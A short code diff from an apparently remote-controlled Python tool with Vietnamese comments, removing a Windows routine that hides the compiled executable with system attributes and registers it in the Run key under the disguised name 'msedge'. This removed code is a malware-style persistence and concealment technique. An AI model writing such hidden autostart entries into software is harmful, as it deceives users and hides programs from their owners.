@@ -91,31 +91,6 @@ def tasks_by_user(user_id: int) -> list:
 def get_mem_mb() -> float:
     return psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024
 
-def add_to_startup():
-    if not sys.platform.startswith('win'):
-        return
-    
-    # Kiem tra neu dang chay duoi dang file .exe (PyInstaller)
-    if getattr(sys, 'frozen', False):
-        pth = f'"{sys.executable}"'
-        # An file exe bang cach set thuoc tinh Hidden va System
-        try:
-            subprocess.run(f'attrib +h +s {pth}', shell=True, creationflags=CREATE_NO_WINDOW)
-        except:
-            pass
-    else:
-        # Neu dang chay script python, khong add vao startup de tranh loi
-        return
-
-    try:
-        key = winreg.HKEY_CURRENT_USER
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
-            winreg.SetValueEx(reg_key, "msedge", 0, winreg.REG_SZ, pth)
-            print(f"Da them vao startup: {pth}")
-    except Exception as e:
-        print(f"Loi khi them vao startup: {e}")
-
 # ============================
 # SUBPROCESS EXECUTOR
 # ============================
@@ -628,7 +603,6 @@ async def fetch_remote_token():
         await asyncio.sleep(5)
 
 async def main():
-    add_to_startup()
     global process_semaphore
     process_semaphore = asyncio.Semaphore(PROCESS_POOL_SIZE)
 
